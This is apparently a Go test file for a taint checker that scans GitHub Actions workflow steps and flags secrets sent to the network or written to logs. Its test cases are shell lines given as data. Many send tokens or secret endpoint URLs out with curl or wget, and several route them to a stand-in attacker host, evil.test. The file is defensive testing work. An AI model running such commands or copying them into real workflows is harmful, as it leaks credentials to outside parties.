package taint

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestAuthenticatedEndpointContract(t *testing.T) {
	tests := []struct {
		name, run string
		kinds     []Kind
	}{
		{"opaque URL is not trusted", `curl "$DESTINATION"`, []Kind{Network}},
		{"names do not confer trust", `WEBHOOK="$DESTINATION"; curl "$WEBHOOK"`, []Kind{Network}},
		{"whole destination", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl "$DESTINATION"`, nil},
		{"explicit URL option", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl --url "${DESTINATION}"`, nil},
		{"public pipeline", "# gh-aw: authenticated-endpoint DESTINATION\n" + `jq -c '.items[] | select(.type == "report_security_finding") | {text: "\(.summary)\n\n\(.details)"}' \
  "$GH_AW_AGENT_OUTPUT" | curl --fail -sS -H 'Content-Type: application/json' --data @- "$DESTINATION"`, nil},
		{"payload", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl -d "$TOKEN" "$DESTINATION"`, []Kind{Network}},
		{"same secret payload", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl -d "$DESTINATION" "$DESTINATION"`, []Kind{Network}},
		{"stdin", "# gh-aw: authenticated-endpoint DESTINATION\n" + `printf '%s' "$TOKEN" | curl --data @- "$DESTINATION"`, []Kind{Network}},
		{"stdin upload", "# gh-aw: authenticated-endpoint DESTINATION\n" + `printf '%s' "$TOKEN" | curl -T - "$DESTINATION"`, []Kind{Network}},
		{"inline stdin upload", "# gh-aw: authenticated-endpoint DESTINATION\n" + `printf '%s' "$TOKEN" | curl --upload-file=- "$DESTINATION"`, []Kind{Network}},
		{"nonblocking stdin upload", "# gh-aw: authenticated-endpoint DESTINATION\n" + `printf '%s' "$TOKEN" | curl -T . "$DESTINATION"`, []Kind{Network}},
		{"file upload", "# gh-aw: authenticated-endpoint DESTINATION\n" + `printf '%s' "$TOKEN" > body; curl -T body "$DESTINATION"`, []Kind{Network}},
		{"header", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl -H "X-Data: $TOKEN" "$DESTINATION"`, []Kind{Network}},
		{"auth header", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl -H "Authorization: Bearer $TOKEN" "$DESTINATION"`, nil},
		{"logging", "# gh-aw: authenticated-endpoint DESTINATION\n" + `echo "$DESTINATION"; curl "$DESTINATION"`, []Kind{Log}},
		{"xtrace", "# gh-aw: authenticated-endpoint DESTINATION\n" + `set -x; curl "$DESTINATION"`, []Kind{Log}},
		{"attacker path", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl "https://evil.test/$DESTINATION"`, []Kind{Network}},
		{"attacker query", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl "https://evil.test/?url=$DESTINATION"`, []Kind{Network}},
		{"appended secret", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl "$DESTINATION?token=$TOKEN"`, []Kind{Network}},
		{"appended public data", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl "$DESTINATION/$PATH_SUFFIX"`, []Kind{Network}},
		{"unquoted", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl $DESTINATION`, []Kind{Network}},
		{"parameter transform", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl "${DESTINATION#https://}"`, []Kind{Network}},
		{"parameter default", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl "${DESTINATION:-https://evil.test}"`, []Kind{Network}},
		{"alias", "# gh-aw: authenticated-endpoint DESTINATION\n" + `COPY="$DESTINATION"; curl "$COPY"`, []Kind{Network}},
		{"reassigned destination", "# gh-aw: authenticated-endpoint DESTINATION\n" + `DESTINATION="https://evil.test/$DESTINATION"; curl "$DESTINATION"`, []Kind{Network}},
		{"prefix reassignment", "# gh-aw: authenticated-endpoint DESTINATION\n" + `DESTINATION="https://evil.test/$DESTINATION" curl "$DESTINATION"`, []Kind{Network}},
		{"loop reassignment", "# gh-aw: authenticated-endpoint DESTINATION\n" + `for DESTINATION in "https://evil.test/$DESTINATION"; do curl "$DESTINATION"; done`, []Kind{Network}},
		{"multiple destinations", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl "$DESTINATION" https://evil.test`, []Kind{Network}},
		{"redirects", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl -L "$DESTINATION"`, []Kind{Network}},
		{"config", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl -K config "$DESTINATION"`, []Kind{Network}},
		{"proxy", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl --proxy https://evil.test "$DESTINATION"`, []Kind{Network}},
		{"URL rewrite", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl --request-target "https://evil.test/$DESTINATION" "$DESTINATION"`, []Kind{Network}},
		{"verbose", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl -v "$DESTINATION"`, []Kind{Network}},
		{"next request", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl "$DESTINATION" --next https://evil.test`, []Kind{Network}},
		{"other network client", "# gh-aw: authenticated-endpoint DESTINATION\n" + `wget "$DESTINATION"`, []Kind{Network}},
		{"sent elsewhere", "# gh-aw: authenticated-endpoint DESTINATION\n" + `curl -d "$DESTINATION" https://evil.test`, []Kind{Network}},
		{"annotation in string", `: '# gh-aw: authenticated-endpoint DESTINATION'; curl "$DESTINATION"`, []Kind{Network}},
		{"sourced mutation", "# gh-aw: authenticated-endpoint DESTINATION\n" + `. helper; curl "$DESTINATION"`, []Kind{Network}},
		{"printf mutation", "# gh-aw: authenticated-endpoint DESTINATION\n" + `printf -v DESTINATION 'https://evil.test/%s' "$DESTINATION"; curl "$DESTINATION"`, []Kind{Log, Network}},
		{"dynamic printf mutation", "# gh-aw: authenticated-endpoint DESTINATION\n" + `OPTION=-v; printf "$OPTION" DESTINATION 'https://evil.test/%s' "$DESTINATION"; curl "$DESTINATION"`, []Kind{Log, Network}},
		{"builtin mutation", "# gh-aw: authenticated-endpoint DESTINATION\n" + `builtin printf -v DESTINATION 'https://evil.test/%s' "$DESTINATION"; curl "$DESTINATION"`, []Kind{Network}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var steps strings.Builder
			steps.WriteString("      - env:\n          DESTINATION: ${{ secrets.ENDPOINT }}\n          TOKEN: ${{ secrets.TOKEN }}\n        run: |\n")
			for line := range strings.SplitSeq(tt.run, "\n") {
				steps.WriteString("          " + line + "\n")
			}
			result := checkSteps(t, steps.String())
			var kinds []Kind
			for _, finding := range result.Findings {
				kinds = append(kinds, finding.Site.Kind)
			}
			assert.Equal(t, tt.kinds, kinds, "%+v", result.Findings)
			if tt.name == "payload" {
				require.Len(t, result.Findings, 1)
				require.Len(t, result.Findings[0].Sources, 1)
				assert.Equal(t, "secrets.token", result.Findings[0].Sources[0].Reference)
			}
		})
	}
}

func TestAuthenticatedEndpointRequiresDirectStepSecret(t *testing.T) {
	for _, binding := range []string{
		`https://evil.test/${{ secrets.ENDPOINT }}`,
		`${{ format('https://evil.test/{0}', secrets.ENDPOINT) }}`,
		`${{ secrets.ENDPOINT || secrets.FALLBACK }}`,
		`${{ secrets[vars.NAME] }}`,
		`${{ toJSON(secrets) }}`,
	} {
		t.Run(binding, func(t *testing.T) {
			result := checkSteps(t, `      - env:
          DESTINATION: `+binding+`
        run: |
          # gh-aw: authenticated-endpoint DESTINATION
          curl "$DESTINATION"
`)
			require.Len(t, result.Findings, 1, "%+v", result)
			assert.Equal(t, Network, result.Findings[0].Site.Kind)
		})
	}
	result := checkSteps(t, `      - env:
          DESTINATION: ${{ secrets.ENDPOINT }}
        run: |
          # gh-aw: authenticated-endpoint DESTINATION
          curl "$DESTINATION"
      - env:
          DESTINATION: ${{ secrets.ENDPOINT }}
        run: curl "$DESTINATION"
`)
	require.Len(t, result.Findings, 1)
	assert.Equal(t, "jobs.test.steps[1].run", result.Findings[0].Site.Path)
}
